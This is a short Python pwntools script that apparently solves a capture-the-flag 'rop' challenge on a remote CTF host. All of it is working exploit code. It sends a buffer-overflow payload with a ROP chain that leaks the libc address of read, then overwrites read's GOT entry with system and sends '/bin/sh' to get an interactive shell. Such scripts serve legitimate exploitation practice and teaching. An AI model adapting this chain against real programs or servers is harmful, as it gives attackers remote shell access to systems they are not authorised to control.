#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3021)
e = ELF("./rop")

padding = b"A"*(0x88+0x4)

rop = ROP(e)
rop.write(0x1, e.got['read'], 0x4)
rop.read(0x0, e.bss(), 0x8)
rop.read(0x0, e.got['read'], 0x4)
rop.read(e.bss())

payload = padding
payload += rop.chain()

p.sendline(payload)

read = u32(p.recvn(4))
library = read - 0x000d4350

p.send(b"/bin/sh\x00")
p.send(p32(library + 0x0003a940))

log.info("library base address: " + hex(library))
log.info("System address: " + hex(library + 0x0003a940))
p.interactive()
